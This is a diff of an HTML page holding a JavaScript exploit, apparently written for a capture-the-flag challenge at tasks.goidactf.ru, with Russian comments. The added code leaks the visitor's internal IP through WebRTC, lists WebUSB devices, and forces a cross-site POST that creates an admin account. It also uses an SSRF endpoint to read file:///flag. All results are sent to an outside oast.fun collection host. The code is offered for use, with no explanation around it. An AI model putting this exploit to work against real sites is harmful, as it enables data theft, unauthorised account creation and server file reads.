@@ -1,34 +1,90 @@
 <!DOCTYPE html>
 <script>
-// Тест возможностей headless chrome
-const tests = {
-    'WebGL': () => !!document.createElement('canvas').getContext('webgl'),
-    'WebGPU': () => !!navigator.gpu,
-    'SharedArrayBuffer': () => !!window.SharedArrayBuffer,
-    'WebAssembly': () => !!window.WebAssembly,
-    'SpeechSynthesis': () => !!window.speechSynthesis,
-    'WebUSB': () => !!navigator.usb,
-    'WebBluetooth': () => !!navigator.bluetooth,
-    'WebRTC': () => !!window.RTCPeerConnection,
-    'Clipboard API': () => !!navigator.clipboard,
-    'Storage Access API': () => !!document.hasStorageAccess,
-    'Origin Trials': () => {
-        const meta = document.createElement('meta');
-        meta.httpEquiv = 'origin-trial';
-        return !!meta.content;
+const TARGET = 'https://tasks.goidactf.ru:20431';
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+
+// Функция для отправки данных
+function send(label, data) {
+    const encoded = btoa(JSON.stringify(data));
+    new Image().src = COLLAB + '/?label=' + label + '&data=' + encodeURIComponent(encoded);
+}
+
+// 1. Получаем внутренний IP через WebRTC
+const getInternalIP = () => {
+    const pc = new RTCPeerConnection({iceServers: []});
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = (ice) => {
+        if (ice.candidate && ice.candidate.candidate) {
+            send('webrtc_candidate', ice.candidate.candidate);
+        }
+    };
+};
+
+// 2. Пробуем WebUSB
+const tryWebUSB = () => {
+    if (navigator.usb) {
+        navigator.usb.getDevices()
+        .then(devices => {
+            send('webusb_devices', devices.map(d => ({
+                vendorId: d.vendorId,
+                productId: d.productId
+            })));
+        });
     }
 };
 
-let results = '';
-for (const [name, test] of Object.entries(tests)) {
-    try {
-        results += `${name}: ${test()}\n`;
-    } catch(e) {
-        results += `${name}: ERROR\n`;
+// 3. Storage Access для целевого сайта
+const tryStorageAccess = () => {
+    if (document.requestStorageAccess) {
+        document.requestStorageAccess()
+        .then(() => {
+            // Теперь можем делать запросы с куками
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = TARGET + '/create_admin';
+            form.target = '_blank';
+            form.innerHTML = '<input name="new_admin_login" value="FULL_ACCESS_ADMIN">';
+            document.body.appendChild(form);
+            form.submit();
+            
+            send('storage_access', 'granted_and_form_submitted');
+        });
     }
-}
+};
 
-// Отправляем результаты
-new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?capabilities=' + 
-                  encodeURIComponent(results);
+// Запускаем всё
+getInternalIP();
+tryWebUSB();
+tryStorageAccess();
+
+// Также пробуем прочитать флаг через SSRF если возможно
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.srcdoc = `
+<!DOCTYPE html>
+<html>
+<head><base href="${TARGET}/"></head>
+<body>
+<script>
+    fetch('/get_url', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({url: 'file:///flag'})
+    })
+    .then(r => r.text())
+    .then(data => {
+        parent.postMessage({type: 'flag', data: data}, '*');
+    });
+<\/script>
+</body>
+</html>`;
+
+document.body.appendChild(iframe);
+
+window.addEventListener('message', (e) => {
+    if (e.data.type === 'flag') {
+        send('flag_found', e.data.data);
+    }
+});
 </script>
